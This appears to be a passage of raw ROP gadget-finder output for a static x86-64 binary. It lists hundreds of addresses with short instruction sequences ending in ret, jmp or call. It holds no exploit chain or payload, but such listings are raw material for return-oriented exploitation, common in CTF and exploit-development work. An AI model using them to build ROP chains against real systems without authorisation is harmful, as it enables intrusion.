0x000000000043f03c : cli ; add dword ptr [rdx + 4], esi ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044f89e : cli ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x000000000044f8fc : cli ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x000000000049b73e : cli ; call qword ptr [rax + 0x20fffa07]
0x000000000049b916 : cli ; call qword ptr [rax + 0x20fffa0b]
0x000000000049bc36 : cli ; call qword ptr [rax + 0x20fffa2e]
0x000000000049c21e : cli ; call qword ptr [rax - 0x1f000566]
0x000000000049c302 : cli ; call qword ptr [rax - 0x4f000510]
0x000000000049c25e : cli ; call qword ptr [rax]
0x00000000004b9212 : cli ; call qword ptr [rbx]
0x00000000004b8f12 : cli ; call qword ptr [rcx]
0x00000000004b872a : cli ; call qword ptr [rdi]
0x000000000049b7ea : cli ; call qword ptr [rdx + 0x22fffa09]
0x000000000049bce2 : cli ; call qword ptr [rdx + 0x22fffa30]
0x000000000049b80a : cli ; call qword ptr [rdx]
0x000000000049b786 : cli ; call qword ptr [rsi + 0x26fffa06]
0x000000000049bc7e : cli ; call qword ptr [rsi + 0x26fffa2d]
0x000000000049b766 : cli ; call qword ptr [rsi]
0x000000000049c24e : cli ; call rax
0x00000000004b8696 : cli ; call rcx
0x000000000049b7fa : cli ; call rdx
0x000000000049b74e : cli ; call rsi
0x000000000049b8c2 : cli ; call rsp
0x0000000000452eb5 : cli ; cmp eax, 0x83497174 ; ret
0x00000000004860b0 : cli ; dec dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000478787 : cli ; dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x000000000049bc42 : cli ; inc dword ptr [rax + 0x2d] ; cli ; call rax
0x000000000049be1a : cli ; inc dword ptr [rax + 0x31] ; cli ; call rax
0x000000000049b922 : cli ; inc dword ptr [rax + 0xa] ; cli ; call rax
0x000000000049b74a : cli ; inc dword ptr [rax + 6] ; cli ; call rsi
0x000000000049c22a : cli ; inc dword ptr [rax - 0x2f000562] ; lahf ; cli ; jmp qword ptr [rax]
0x000000000049c21a : cli ; inc dword ptr [rax - 0x67] ; cli ; call qword ptr [rax - 0x1f000566]
0x000000000049c24a : cli ; inc dword ptr [rax - 0x6c] ; cli ; call rax
0x000000000049c162 : cli ; inc dword ptr [rax] ; cli ; call qword ptr [rax]
0x000000000049c2ba : cli ; inc dword ptr [rax] ; in al, dx ; cli ; jmp qword ptr [rax]
0x000000000049b912 : cli ; inc dword ptr [rax] ; or al, 0xfa ; call qword ptr [rax + 0x20fffa0b]
0x000000000049b73a : cli ; inc dword ptr [rax] ; or dl, bh ; call qword ptr [rax + 0x20fffa07]
0x00000000004603ef : cli ; inc dword ptr [rbx - 0x76be0008] ; ret 0x840f
0x000000000045914d : cli ; inc dword ptr [rcx - 0x77] ; ret
0x000000000045c435 : cli ; inc dword ptr [rcx - 0x77] ; ret 0x5be9
0x000000000049b8be : cli ; inc dword ptr [rdi + rax - 6] ; call rsp
0x000000000049bcee : cli ; inc dword ptr [rdx + 0x2f] ; cli ; call rdx
0x000000000049b7f6 : cli ; inc dword ptr [rdx + 8] ; cli ; call rdx
0x000000000049b7e6 : cli ; inc dword ptr [rdx] ; or bh, dl ; call qword ptr [rdx + 0x22fffa09]
0x000000000049bcde : cli ; inc dword ptr [rdx] ; xor edx, edi ; call qword ptr [rdx + 0x22fffa30]
0x000000000049b752 : cli ; inc dword ptr [rsi + 0xc] ; cli ; call rsi
0x000000000049bdb6 : cli ; inc dword ptr [rsi + rbp - 6] ; call rsp
0x000000000049bc7a : cli ; inc dword ptr [rsi] ; cli ; call qword ptr [rsi + 0x26fffa2d]
0x000000000049c152 : cli ; inc eax ; cli ; call rax
0x000000000049c2e2 : cli ; inc eax ; out dx, eax ; cli ; jmp rax
0x000000000049be3a : cli ; inc eax ; sub eax, 0x2d50fffa ; cli ; jmp rax
0x000000000043eff7 : cli ; jg 0x43f00a ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x000000000044d776 : cli ; jg 0x44d788 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x000000000044dda9 : cli ; jg 0x44ddbc ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000044e211 : cli ; jg 0x44e224 ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000044e932 : cli ; jg 0x44e942 ; vzeroupper ; ret
0x000000000044eb08 : cli ; jg 0x44eb18 ; vzeroupper ; ret
0x000000000049b742 : cli ; jmp qword ptr [rax]
0x000000000049befe : cli ; jmp qword ptr [rdx + 0x12fffa23]
0x000000000049bef6 : cli ; jmp qword ptr [rdx + 0x22fffa24]
0x000000000049beee : cli ; jmp qword ptr [rdx + 0x22fffa25]
0x000000000049bee6 : cli ; jmp qword ptr [rdx + 0x22fffa26]
0x000000000049bede : cli ; jmp qword ptr [rdx + 0x22fffa27]
0x000000000049b7ee : cli ; jmp qword ptr [rdx]
0x000000000049b78a : cli ; jmp qword ptr [rsi]
0x000000000049b732 : cli ; jmp rax
0x0000000000413be4 : cli ; jmp rdx
0x000000000049b77a : cli ; jmp rsi
0x000000000049b8a6 : cli ; jmp rsp
0x000000000049bcc6 : cli ; ljmp ptr [rsp + rbp + 0x2c3cfffa] ; cli ; jmp rdx
0x0000000000436948 : cli ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000413ec6 : cli ; movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x00000000004325f8 : cli ; movzx edx, dl ; sub eax, edx ; ret
0x00000000004310a6 : cli ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004b0601 : cli ; push 0x6e ; ja 0x4b058e ; ret 0x48f
0x000000000049c03e : cli ; push qword ptr [rax + 0x23] ; cli ; jmp rax
0x000000000049c056 : cli ; push qword ptr [rax + 0x28] ; cli ; jmp rax
0x000000000049b91e : cli ; push qword ptr [rax + 0x40fffa0a] ; or bh, dl ; call rax
0x000000000049be16 : cli ; push qword ptr [rax + 0x40fffa31] ; xor edx, edi ; call rax
0x000000000049c246 : cli ; push qword ptr [rax + 0x40fffaa7] ; xchg eax, esp ; cli ; call rax
0x000000000049c1be : cli ; push qword ptr [rax + 0x7a] ; cli ; call qword ptr [rax]
0x000000000049c2de : cli ; push qword ptr [rax - 0x3f000511] ; out dx, eax ; cli ; jmp rax
0x000000000049c14e : cli ; push qword ptr [rax - 0x3f0005c1] ; cli ; call rax
0x000000000049c1de : cli ; push qword ptr [rax - 0x79] ; cli ; call qword ptr [rax]
0x000000000049c1d6 : cli ; push qword ptr [rax] ; test dl, bh ; call rax
0x000000000049b8ba : cli ; push qword ptr [rdi + rax + 0x744fffa] ; cli ; call rsp
0x000000000049b7f2 : cli ; push qword ptr [rdx + 0x42fffa08] ; or dl, bh ; call rdx
0x000000000049ba96 : cli ; push qword ptr [rdx + rax - 6] ; jmp rsp
0x000000000049bdb2 : cli ; push qword ptr [rsi + rbp + 0x2e44fffa] ; cli ; call rsp
0x000000000049c03a : cli ; push rax ; and edi, edx ; push qword ptr [rax + 0x23] ; cli ; jmp rax
0x000000000049c15e : cli ; push rax ; cli ; inc dword ptr [rax] ; cli ; call qword ptr [rax]
0x000000000049c332 : cli ; push rax ; int1 ; cli ; call qword ptr [rax]
0x000000000049c1ba : cli ; push rax ; push rdi ; cli ; push qword ptr [rax + 0x7a] ; cli ; call qword ptr [rax]
0x000000000049c052 : cli ; push rax ; sub dl, bh ; push qword ptr [rax + 0x28] ; cli ; jmp rax
0x000000000049bcfa : cli ; push rdx ; sub eax, 0x2d82fffa ; cli ; call qword ptr [rdx]
0x000000000044e6e9 : cli ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x00000000004af0a5 : cli ; ret 0xac65
0x000000000045282b : cli ; setae al ; ret
0x00000000004474e9 : cli ; test rdx, rdx ; je 0x447509 ; bsf rax, rdx ; ret
0x000000000047a408 : cli ; test rdx, rdx ; je 0x47a439 ; bsf rax, rdx ; ret
0x00000000004adcea : cli ; xchg dword ptr [rsp + rax + 0x6fa9ce9d], esp ; ret
0x00000000004b33ca : cmc ; call qword ptr [rdx]
0x00000000004b346a : cmc ; call rax
0x00000000004b33de : cmc ; call rsp
0x00000000004b3582 : cmc ; jmp qword ptr [rax]
0x00000000004b0a29 : cmc ; mov ch, 0xab ; ret
0x000000000043b78a : cmc ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004361ce : cmc ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004015fc : cmc ; mov eax, r8d ; cdqe ; ret
0x0000000000476a57 : cmc ; mov rbp, rax ; jmp 0x476a24
0x000000000044cb33 : cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00000000004ad8d7 : cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00000000004b2449 : cmc ; std ; call qword ptr [rax]
0x000000000044cb37 : cmc ; sub eax, edx ; ret
0x00000000004b0065 : cmc ; xlatb ; ret 0x4e27
0x000000000041fae9 : cmovae eax, dword ptr [rdi + 0x10] ; sub rax, qword ptr [rdi + 0x18] ; ret
0x000000000041fae8 : cmovae rax, qword ptr [rdi + 0x10] ; sub rax, qword ptr [rdi + 0x18] ; ret
0x000000000044ec04 : cmove eax, ecx ; pop rbx ; ret
0x0000000000478ae1 : cmove eax, ecx ; ret
0x000000000042a233 : cmove eax, edx ; add rsp, 8 ; ret
0x000000000044ebcc : cmove eax, edx ; pop rbx ; ret
0x000000000042a36f : cmove eax, edx ; ret
0x000000000041b53f : cmove ebp, esp ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000485398 : cmove ecx, eax ; mov rax, rcx ; ret
0x0000000000478ae0 : cmove r8, rcx ; ret
0x000000000044ec03 : cmove rax, rcx ; pop rbx ; ret
0x000000000042a232 : cmove rax, rdx ; add rsp, 8 ; ret
0x000000000044ebcb : cmove rax, rdx ; pop rbx ; ret
0x000000000042a36e : cmove rax, rdx ; ret
0x0000000000485397 : cmove rcx, rax ; mov rax, rcx ; ret
0x000000000041cf2b : cmovg eax, ecx ; test rdx, rdx ; jne 0x41cf29 ; ret
0x00000000004775fb : cmovg eax, ecx ; test rdx, rdx ; jne 0x4775f9 ; ret
0x000000000042986a : cmovne eax, ecx ; ret
0x0000000000401e16 : cmovne eax, edx ; pop rbx ; ret
0x000000000040189b : cmovne eax, edx ; ret
0x0000000000447074 : cmovne eax, edx ; vzeroupper ; ret
0x0000000000429869 : cmovne rax, rcx ; ret
0x000000000044ec5b : cmovne rax, rdx ; pop rbx ; ret
0x000000000040189a : cmovne rax, rdx ; ret
0x0000000000447073 : cmovne rax, rdx ; vzeroupper ; ret
0x000000000040732c : cmovno esi, dword ptr [rcx] ; ret
0x00000000004577ac : cmovs eax, edx ; ret
0x00000000004947a8 : cmovs ecx, dword ptr [rcx + 0x1bffe] ; add byte ptr [rax], al ; jmp rax
0x0000000000478848 : cmovs edi, dword ptr [rcx] ; int1 ; jne 0x478849 ; lea eax, dword ptr [rdx + rdi] ; ret
0x000000000044ebae : cmovs esp, dword ptr [rbx + 0xc] ; xchg byte ptr [rax + 1], cl ; int1 ; jmp rcx
0x000000000044ec40 : cmovs esp, dword ptr [rbx + 4] ; xchg eax, esi ; add rax, rsi ; jmp rax
0x000000000044d648 : cmp ah, byte ptr [rbx - 0x27] ; add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x000000000048efe0 : cmp al, 0x23 ; add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rbx ; ret
0x000000000045c5d2 : cmp al, 0x24 ; add byte ptr [rcx - 0x77], al ; ret
0x0000000000456462 : cmp al, 0x24 ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x000000000041d0f7 : cmp al, 0x24 ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000041d0e6 : cmp al, 0x24 ; call 0x419374
0x00000000004948fd : cmp al, 0x24 ; mov rdx, qword ptr [rbp] ; call r12
0x000000000049bccc : cmp al, 0x2c ; cli ; jmp rdx
0x0000000000493dcc : cmp al, 0x31 ; or byte ptr [rbp + 4], dh ; mov qword ptr [rax], rdx ; ret
0x0000000000493d5d : cmp al, 0x32 ; or byte ptr [rbp + 0x1a], dh ; mov rax, qword ptr [rax] ; ret
0x00000000004b7038 : cmp al, 0x46 ; add byte ptr [rax], al ; hlt ; insb byte ptr [rdi], dx ; stc ; call rsp
0x00000000004aece0 : cmp al, 0x46 ; clc ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00000000004b9238 : cmp al, 0x68 ; add byte ptr [rax], al ; xor al, 0xa4 ; cli ; call qword ptr [rdx]
0x0000000000460fc1 : cmp al, 0xb3 ; add rdi, r11 ; jmp rdi
0x0000000000413ec9 : cmp al, 0xba ; add rdi, r10 ; jmp rdi
0x000000000049b1bd : cmp al, 0xf9 ; jmp qword ptr [rax]
0x00000000004b2999 : cmp al, 0xfe ; jmp rax
0x00000000004520cd : cmp al, 0xff ; dec dword ptr [rax - 0x7f] ; ret
0x000000000044cff6 : cmp al, byte ptr [rsi - 1] ; jne 0x44d01c ; xor eax, eax ; ret
0x00000000004877ff : cmp al, ch ; ret
0x0000000000431e66 : cmp al, dh ; ret
0x0000000000431e65 : cmp al, r14b ; ret
0x0000000000491b46 : cmp bh, 0x10 ; jne 0x491b6f ; xor eax, eax ; ret
0x0000000000494ce6 : cmp bh, 0x10 ; jne 0x494d05 ; xor eax, eax ; ret
0x0000000000495b46 : cmp bh, 0x10 ; jne 0x495b65 ; xor eax, eax ; ret
0x00000000004965b6 : cmp bh, 0x10 ; jne 0x4965df ; xor eax, eax ; ret
0x0000000000494ccc : cmp bh, 0x30 ; jne 0x494d01 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000495b2c : cmp bh, 0x30 ; jne 0x495b61 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x00000000004ba5a0 : cmp bh, 0xfb ; jmp qword ptr [rax]
0x000000000049bb10 : cmp bh, bl ; stc ; jmp rax
0x00000000004b6e89 : cmp bh, cl ; jmp qword ptr [rbx]
0x0000000000417462 : cmp byte ptr [r8 - 0x75], cl ; push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x0000000000418e1f : cmp byte ptr [rax + 0x29], cl ; ret
0x000000000047d98b : cmp byte ptr [rax + 0x29], cl ; ret 0x8d49
0x0000000000416d7e : cmp byte ptr [rax + 0x39], cl ; ret
0x00000000004198c9 : cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x000000000040800b : cmp byte ptr [rax + 0x39], cl ; ret 0x4f76
0x0000000000431ea7 : cmp byte ptr [rax + 1], cl ; clc ; ret
0x0000000000477165 : cmp byte ptr [rax + 1], cl ; ret
0x0000000000476bf0 : cmp byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x39], cl ; ret 0xf48
0x0000000000461c27 : cmp byte ptr [rax - 0x73], cl ; dec dword ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x148
0x0000000000457df8 : cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x0000000000461da4 : cmp byte ptr [rax - 0x75], cl ; jl 0x461dd5 ; and byte ptr [rax + 1], cl ; ret
0x0000000000417463 : cmp byte ptr [rax - 0x75], cl ; push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x0000000000476996 : cmp byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x0000000000459704 : cmp byte ptr [rax - 0x7d], cl ; ret 0x4804
0x0000000000431e96 : cmp byte ptr [rax], ah ; ret
0x000000000041d563 : cmp byte ptr [rax], al ; je 0x41d575 ; ret
0x0000000000493ccf : cmp byte ptr [rax], al ; je 0x493cf8 ; add rsp, 0x18 ; ret
0x0000000000446c10 : cmp byte ptr [rax], dh ; cmovne rax, rdx ; ret
0x0000000000431e86 : cmp byte ptr [rax], dl ; ret
0x0000000000431e85 : cmp byte ptr [rax], r10b ; ret
0x0000000000431e95 : cmp byte ptr [rax], r12b ; ret
0x0000000000446c0f : cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x000000000049b6d8 : cmp byte ptr [rbp - 0x412f0007], 0xf9 ; jmp qword ptr [rax]
0x00000000004b8f34 : cmp byte ptr [rbp], ah ; add al, ch ; mov dl, bh ; call qword ptr [rcx]
0x00000000004bb6f9 : cmp byte ptr [rbx + 0x2030d07], al ; cld ; ret
0x00000000004bb72d : cmp byte ptr [rbx + 0x2030d07], al ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004bb6c5 : cmp byte ptr [rbx + 0x3030d07], al ; or al, byte ptr [rcx] ; ret
0x00000000004917e8 : cmp byte ptr [rbx + 0x41], bl ; pop rsi ; ret
0x0000000000414416 : cmp byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x000000000041cbe0 : cmp byte ptr [rbx + 0x5d], bl ; ret
0x0000000000478570 : cmp byte ptr [rcx + 0x5d5b7453], cl ; pop r12 ; ret
0x0000000000493dcb : cmp byte ptr [rcx + rsi], 8 ; jne 0x493dde ; mov qword ptr [rax], rdx ; ret
0x0000000000486c86 : cmp byte ptr [rcx - 0x7d], cl ; ret 0x4908
0x000000000041d528 : cmp byte ptr [rdi], cl ; ret 0x389
0x000000000043378d : cmp byte ptr [rdi], dl ; ret
0x00000000004342a0 : cmp byte ptr [rdi], dl ; ret 0x2373
0x0000000000434289 : cmp byte ptr [rdi], dl ; ret 0x3a73
0x0000000000434272 : cmp byte ptr [rdi], dl ; ret 0x5173
0x0000000000432d2e : cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000493d5c : cmp byte ptr [rdx + rsi], 8 ; jne 0x493d85 ; mov rax, qword ptr [rax] ; ret
0x00000000004b6e88 : cmp byte ptr [rdx], bh ; stc ; jmp qword ptr [rbx]
0x00000000004058df : cmp byte ptr [rsp], al ; add esp, eax ; ret
0x000000000049b1b1 : cmp cl, bh ; jmp qword ptr [rax + 0x20fff939]
0x000000000048f8c2 : cmp cl, byte ptr [rax - 0x7d] ; ret 0xf08
0x000000000040b187 : cmp cl, ch ; ret 0xfffb
0x00000000004b6899 : cmp dh, bh ; jmp qword ptr [rbx]
0x0000000000447071 : cmp dh, byte ptr [rax] ; cmovne rax, rdx ; vzeroupper ; ret
0x000000000044eaea : cmp dh, byte ptr [rdx + 2] ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x0000000000491b45 : cmp dil, 0x10 ; jne 0x491b70 ; xor eax, eax ; ret
0x0000000000494ce5 : cmp dil, 0x10 ; jne 0x494d06 ; xor eax, eax ; ret
0x0000000000495b45 : cmp dil, 0x10 ; jne 0x495b66 ; xor eax, eax ; ret
0x00000000004965b5 : cmp dil, 0x10 ; jne 0x4965e0 ; xor eax, eax ; ret
0x000000000044e7b0 : cmp dl, 1 ; ja 0x44e7d3 ; jb 0x44e7c2 ; mov byte ptr [rdi], cl ; ret
0x000000000043f03b : cmp dl, 1 ; jb 0x43f04d ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044d7aa : cmp dl, 1 ; jb 0x44d7b8 ; mov byte ptr [rdi], cl ; ret
0x00000000004298d5 : cmp dl, al ; jne 0x4298c8 ; sub rax, 0x10 ; ret
0x00000000004298d4 : cmp dl, r8b ; jne 0x4298c9 ; sub rax, 0x10 ; ret
0x0000000000478518 : cmp dword ptr [rax + 0x30], 0 ; je 0x478527 ; ret
0x00000000004153c1 : cmp dword ptr [rax - 0x39], ecx ; ret
0x000000000043b2c8 : cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x000000000044fcd1 : cmp dword ptr [rcx], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x000000000041d561 : cmp dword ptr [rdi + 0x38], 0 ; je 0x41d577 ; ret
0x000000000042b071 : cmp dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x0000000000465393 : cmp dword ptr [rip + 0x39480001], ebx ; ret
0x000000000048650f : cmp eax, -1 ; cmove rax, rdx ; ret
0x0000000000478536 : cmp eax, -1 ; je 0x478549 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048865c : cmp eax, -3 ; jbe 0x48866e ; ret
0x000000000048e3d5 : cmp eax, 0x232b9d ; add byte ptr [rbp + 2], dh ; pop rbx ; ret
0x0000000000467a71 : cmp eax, 0x256caa ; mov rax, qword ptr [rdi + rax*8] ; jmp rax
0x0000000000419372 : cmp eax, 0x2a7c30 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000040a1ba : cmp eax, 0x2b6da0 ; add byte ptr [rax - 0x77], cl ; ret
0x000000000040a91a : cmp eax, 0x5ee8ff31 ; ret 1
0x00000000004511e2 : cmp eax, 0x7d8b48 ; call r12
0x000000000045308f : cmp eax, 0x83482f74 ; ret
0x0000000000452eb6 : cmp eax, 0x83497174 ; ret
0x000000000047a184 : cmp eax, 0x89000001 ; ret 0x8948
0x0000000000450086 : cmp eax, 0xfffff000 ; ja 0x450098 ; ret
0x00000000004500d4 : cmp eax, 0xfffff000 ; ja 0x4500e8 ; ret
0x00000000004502df : cmp eax, 0xfffff000 ; ja 0x450348 ; ret
0x0000000000450375 : cmp eax, 0xfffff000 ; ja 0x450388 ; ret
0x00000000004503b2 : cmp eax, 0xfffff000 ; ja 0x450418 ; ret
0x0000000000450448 : cmp eax, 0xfffff000 ; ja 0x450460 ; ret
0x0000000000450478 : cmp eax, 0xfffff000 ; ja 0x450490 ; ret
0x0000000000450682 : cmp eax, 0xfffff000 ; ja 0x4506d0 ; ret
0x00000000004506f8 : cmp eax, 0xfffff000 ; ja 0x450710 ; ret
0x0000000000450e51 : cmp eax, 0xfffff000 ; ja 0x450e68 ; ret
0x0000000000461bae : cmp eax, 0xfffff000 ; ja 0x461bc8 ; ret
0x000000000047c1d6 : cmp eax, 0xfffff000 ; ja 0x47c1e8 ; ret
0x000000000047c22a : cmp eax, 0xfffff000 ; ja 0x47c240 ; ret
0x000000000044fff8 : cmp eax, 0xfffff001 ; jae 0x450007 ; ret
0x0000000000451088 : cmp eax, 0xfffff001 ; jae 0x451097 ; ret
0x00000000004510b8 : cmp eax, 0xfffff001 ; jae 0x4510c7 ; ret
0x00000000004510e8 : cmp eax, 0xfffff001 ; jae 0x4510f7 ; ret
0x000000000045279b : cmp eax, 0xfffff001 ; jae 0x4527aa ; ret
0x00000000004527c8 : cmp eax, 0xfffff001 ; jae 0x4527d7 ; ret
0x000000000047c158 : cmp eax, 0xfffff001 ; jae 0x47c167 ; ret
0x000000000048f188 : cmp eax, 0xfffff001 ; jae 0x48f197 ; ret
0x000000000044f16b : cmp eax, 2 ; je 0x44f17f ; xor eax, eax ; ret
0x000000000045290a : cmp eax, 4 ; je 0x452915 ; ret
0x0000000000475feb : cmp eax, ecx ; jg 0x476008 ; add eax, edi ; mov rdx, r8 ; jmp 0x475fc7
0x000000000044d5ff : cmp eax, ecx ; jle 0x44d63f ; movsxd rax, ecx ; ret
0x000000000044d013 : cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x000000000041f26b : cmp eax, edx ; jae 0x41f297 ; movzx eax, byte ptr [rax] ; ret
0x000000000048e904 : cmp eax, esi ; je 0x48e915 ; ret
0x0000000000469b2f : cmp eax, esp ; je 0x469966 ; jmp 0x469b04
0x0000000000475fea : cmp eax, r9d ; jg 0x476009 ; add eax, edi ; mov rdx, r8 ; jmp 0x475fc8
0x00000000004ac105 : cmp ebp, 0xfd77f8ff ; jmp rax
0x000000000045d14c : cmp ebp, ebx ; jb 0x45d1be ; mov rdx, rax ; jmp 0x45d115
0x00000000004528a6 : cmp ebx, 0xa ; je 0x4528b1 ; ret
0x0000000000453ffe : cmp ebx, eax ; setne dl ; jmp 0x453fea
0x000000000047a8a5 : cmp ecx, 0xc00 ; je 0x47a8b9 ; ret
0x0000000000452c11 : cmp ecx, dword ptr [rax + 0x10] ; jae 0x452c06 ; ret
0x000000000048dd3e : cmp ecx, dword ptr [rax - 0x3f] ; loop 0x48dd4f ; add rdx, rax ; jmp 0x48dd58
0x0000000000455512 : cmp ecx, dword ptr [rax - 0x7d] ; ret
0x0000000000425724 : cmp ecx, dword ptr [rax - 0x7f] ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; call rax
0x0000000000486558 : cmp ecx, dword ptr [rdi + rsi] ; jae 0x486508 ; xor eax, eax ; ret
0x0000000000478ade : cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x00000000004342bb : cmp ecx, eax ; jne 0x4342e9 ; xor eax, eax ; ret
0x00000000004852e8 : cmp ecx, eax ; jne 0x485292 ; mov eax, dword ptr [rdx + 4] ; ret
0x000000000048ae82 : cmp ecx, ecx ; ret
0x000000000049b1b5 : cmp ecx, edi ; jmp qword ptr [rax]
0x000000000047884a : cmp ecx, esi ; jne 0x478847 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00000000004852d6 : cmp ecx, esi ; jne 0x4852b5 ; ret
0x000000000046caa0 : cmp edi, eax ; ja 0x46ca87 ; mov eax, r9d ; ret
0x000000000049b1b9 : cmp edi, ecx ; jmp qword ptr [rax + 0x20fff93c]
0x000000000047c54e : cmp edi, edx ; ja 0x47c57d ; ret
0x000000000044d9b2 : cmp edi, edx ; jb 0x44d9bf ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000046ca9f : cmp edi, r8d ; ja 0x46ca88 ; mov eax, r9d ; ret
0x000000000042611a : cmp edx, eax ; jne 0x4260e5 ; ret
0x000000000044e79b : cmp edx, ecx ; jne 0x44e788 ; ret
0x000000000044e902 : cmp edx, ecx ; jne 0x44e8ee ; vzeroupper ; ret
0x000000000044eac5 : cmp edx, ecx ; jne 0x44eaa9 ; vzeroupper ; ret
0x000000000045282a : cmp edx, edi ; setae al ; ret
0x000000000047afb6 : cmp edx, esi ; je 0x47afc7 ; test edx, edx ; jne 0x47afb9 ; ret
0x000000000041f2a9 : cmp esi, -1 ; setne al ; neg eax ; ret
0x000000000040185a : cmp esi, 0 ; jne 0x401825 ; ret
0x000000000045f374 : cmp esi, 3 ; je 0x45f386 ; ret
0x000000000044dd95 : cmp esi, dword ptr [rdx + 5] ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004b0064 : cmp esi, ebp ; xlatb ; ret 0x4e27
0x000000000041e4ca : cmp esi, ecx ; jne 0x41e4c7 ; lea eax, dword ptr [rdx + rdi] ; ret
0x0000000000478517 : cmp qword ptr [rax + 0x30], 0 ; je 0x478528 ; ret
0x000000000041d560 : cmp qword ptr [rdi + 0x38], 0 ; je 0x41d578 ; ret
0x00000000004528a5 : cmp r11d, 0xa ; je 0x4528b2 ; ret
0x000000000045d14b : cmp r13, r11 ; jb 0x45d1bf ; mov rdx, rax ; jmp 0x45d116
0x00000000004ac104 : cmp r13d, 0xfd77f8ff ; jmp rax
0x0000000000450085 : cmp rax, -0x1000 ; ja 0x450099 ; ret
0x00000000004500d3 : cmp rax, -0x1000 ; ja 0x4500e9 ; ret
0x00000000004502de : cmp rax, -0x1000 ; ja 0x450349 ; ret
0x0000000000450374 : cmp rax, -0x1000 ; ja 0x450389 ; ret
0x00000000004503b1 : cmp rax, -0x1000 ; ja 0x450419 ; ret
0x0000000000450447 : cmp rax, -0x1000 ; ja 0x450461 ; ret
0x0000000000450477 : cmp rax, -0x1000 ; ja 0x450491 ; ret
0x0000000000450681 : cmp rax, -0x1000 ; ja 0x4506d1 ; ret
0x00000000004506f7 : cmp rax, -0x1000 ; ja 0x450711 ; ret
0x0000000000450e50 : cmp rax, -0x1000 ; ja 0x450e69 ; ret
0x0000000000461bad : cmp rax, -0x1000 ; ja 0x461bc9 ; ret
0x000000000047c1d5 : cmp rax, -0x1000 ; ja 0x47c1e9 ; ret
0x000000000047c229 : cmp rax, -0x1000 ; ja 0x47c241 ; ret
0x000000000044fff7 : cmp rax, -0xfff ; jae 0x450008 ; ret
0x0000000000451087 : cmp rax, -0xfff ; jae 0x451098 ; ret
0x00000000004510b7 : cmp rax, -0xfff ; jae 0x4510c8 ; ret
0x00000000004510e7 : cmp rax, -0xfff ; jae 0x4510f8 ; ret
0x000000000045279a : cmp rax, -0xfff ; jae 0x4527ab ; ret
0x00000000004527c7 : cmp rax, -0xfff ; jae 0x4527d8 ; ret
0x000000000047c157 : cmp rax, -0xfff ; jae 0x47c168 ; ret
0x000000000048f187 : cmp rax, -0xfff ; jae 0x48f198 ; ret
0x000000000048650e : cmp rax, -1 ; cmove rax, rdx ; ret
0x000000000048865b : cmp rax, -3 ; jbe 0x48866f ; ret
0x000000000041f26a : cmp rax, rdx ; jae 0x41f298 ; movzx eax, byte ptr [rax] ; ret
0x000000000048e903 : cmp rax, rsi ; je 0x48e916 ; ret
0x0000000000452c10 : cmp rcx, qword ptr [rax + 0x10] ; jae 0x452c07 ; ret
0x0000000000486557 : cmp rcx, qword ptr [rdi + rsi] ; jae 0x486509 ; xor eax, eax ; ret
0x0000000000478add : cmp rcx, qword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x00000000004852e7 : cmp rcx, r8 ; jne 0x485293 ; mov eax, dword ptr [rdx + 4] ; ret
0x00000000004342ba : cmp rcx, rax ; jne 0x4342ea ; xor eax, eax ; ret
